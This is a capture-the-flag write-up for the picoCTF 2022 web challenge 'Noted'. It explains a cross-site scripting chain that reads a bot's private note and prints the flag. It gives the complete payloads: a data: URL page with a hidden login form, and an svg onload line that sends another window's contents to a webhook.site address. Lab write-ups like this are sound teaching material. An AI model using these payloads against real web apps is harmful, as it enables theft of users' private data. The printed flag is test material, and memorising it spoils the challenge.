  # picoCTF2022: Noted

![Contest Date: 15.03.2022](https://img.shields.io/badge/Contest%20Date-15.03.2022-lightgrey.svg)
![Solve Moment: During The Contest](https://img.shields.io/badge/Solve%20Moment-During%20The%20Contest-brightgreen.svg)
![Score: 500](https://img.shields.io/badge/Score-500-brightgreen.svg)

## Description

> I made a nice web app that lets you take notes. I'm pretty sure I've followed all the best practices so its definitely secure right?
Note that the headless browser used for the "report" feature does not have access to the internet.




## Attached Files

- noted.tar.gz

## Flag

```
picoCTF{p00rth0s_parl1ment_0f_p3p3gas_386f0184}
```

## Detailed Solution

After looking at the source, it seems that this is a website that allows users to create an account, login, and then (upon login) create notes. The notes seem to be visible only to the logged in user and not accessible through some URL. Furthermore, in report.js, the following lines of code suggest that the flag is stored in a note of the puppeteer bot.

```js

		await page.goto('http://0.0.0.0:8080/new');
		await page.type('[name="title"]', 'flag');
		await page.type('[name="content"]', process.env.FLAG ?? 'ctf{flag}');
  ```
  

We can start by looking through similar past web exploit challenges and writeups that involved note taking apps. After searching online for these, we can get some results such as [TBDXSS](https://ctftime.org/task/17592) and [XSS On Other Domain](https://www.youtube.com/watch?v=9ecv6ILXrZo). Given these results, XSS seems to be the way to go, but we need to first see if the website is vulnerable to it. To do so, we first create an account and enter in a sample test payload in our notes such as
```js
  <script>alert(1)</script>
```
Putting this in Notes, <p align="center">![logo](https://github.com/Thinker28/picoCTF2022/blob/main/Web-Exploitation/Noted/Screen%20Shot%202022-04-06%20at%202.39.01%20PM.png)</p>

We get, <p align="center">![logo](https://github.com/Thinker28/picoCTF2022/blob/main/Web-Exploitation/Noted/Screen%20Shot%202022-04-06%20at%202.43.57%20PM.png)</p>

This confirms that the website is vulnerable to XSS. Now we need a payload that the puppeteer bot will run and yield the note with the flag. Our initial plan was to fetch the notes of the bot by 
```	1) using the `fetch()` JS command 
	2) sending the response of 1) to our webhook which would yield the flag
```
However, this did not work. After a lot of Googling, this is a common setback in many XSS challenges and is caused by the CORS policy being disabled. At this point, we tried searching up CORS Bypass and came up with following: [Hacktricks](https://book.hacktricks.xyz/pentesting-web/cors-bypass) and [Medium](https://medium.com/the-crazy-coder/a-comprehensive-understanding-of-cors-all-frontend-developers-better-to-have-3ae46d35f19e). After reaching a dead-end with the CORS bypass, we switched tracks by looking back at [TDXSS] and [XSS On Other Domain] and saw that we can use an iframe/window to have the bot's notes open while we login to our account to do XSS in parallel. It helps us that we automatically go to the user's notes after logging in. 

So here, we wondered if it would be possible to somehow access the window we had opened before logging in? After some testing and searching up how window onjects work, it turned out YES! We can access that window that we opened and keep it open as we login. Then the XSS can access the previously opened page's content because of same-origin policy. So now putting these steps together, 1) We first open a window of the bot's notes 2) We can login with our temporary user 3) Do XSS and gain access to our temporary user's notes 4) Open our previously opened window of the bot's notes which we can then send to our webhook as a GET request, where we can get the flag. Now that we have the plan, it's time to implement this and put it together. We can start off with the code we're going to inject in the Report function. To login as our user, we can use the <form> and <input> tags, with them put together as
```html
<form action="http://0.0.0.0:8080/login" method=POST id=WebsiteForm target=_blank>
<input type="text" name="username" value="test"><input type="text" name="password" value="test">
</form>
```

Then we want want to open up a window, with the bots notes and submit the form. To open up a window we can use `window.open()`, and to submit the form we can use ``setTimeout(`WebsiteForm.submit(), 1000`)``. Putting this together, we get 

```html
<form action="http://0.0.0.0:8080/login" method=POST id=WebsiteForm target=_blank>
<input type="text" name="username" value="test"><input type="text" name="password" value="test">
</form>
<script>window.open('http://0.0.0.0:8080/notes','window1');setTimeout(`WebsiteForm.submit()`)</script>
```

We also have to put this with data:text/html, so we actually get

```html
data:text/html,
<form action="http://0.0.0.0:8080/login" method=POST id=WebsiteForm target=_blank>
<input type="text" name="username" value="test"><input type="text" name="password" value="test">
</form>
<script>window.open('http://0.0.0.0:8080/notes','window1');setTimeout(`WebsiteForm.submit()`)</script>
```

Now we need to create the XSS we will use in our notes of the temporary user. So searching this up [Hacktricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting), we can abuse some html tag. I chose to abuse the <svg tag, but you can use anything. Now, we want to open the window that has the bot's notes, and somehow send it to our webhook. After thinking about it, I realized that I can put it in the request itself, by putting the url of the webhook, and concatenating it with the note text. Putting this together we get,

```html
<svg onload="window.location='https://webhook.site/5ca98311-0281-432a-a3f7-6ebd23deb0dc/'+window.open('', 'window1').document.body.textContent">
```

Now we have our full payload, which *might* work. Let's try it out!

Putting our payload in our temporary user's notes: <p align="center">![logo](https://github.com/Thinker28/picoCTF2022/blob/main/Web-Exploitation/Noted/Screen%20Shot%202022-04-06%20at%204.02.11%20PM.png)</p>

Putting our payload in the Report function: <p align="center">![logo](https://github.com/Thinker28/picoCTF2022/blob/main/Web-Exploitation/Noted/Screen%20Shot%202022-04-06%20at%204.04.06%20PM.png)</p>
  
Webhook Request: <p align="center">![logo](https://github.com/Thinker28/picoCTF2022/blob/main/Web-Exploitation/Noted/Screen%20Shot%202022-04-06%20at%204.05.36%20PM.png)

Url Decoding: <p align="center">![logo](https://github.com/Thinker28/picoCTF2022/blob/main/Web-Exploitation/Noted/Screen%20Shot%202022-04-06%20at%204.07.43%20PM.png)
 
That's our flag! That's all for the writeup for Noted.
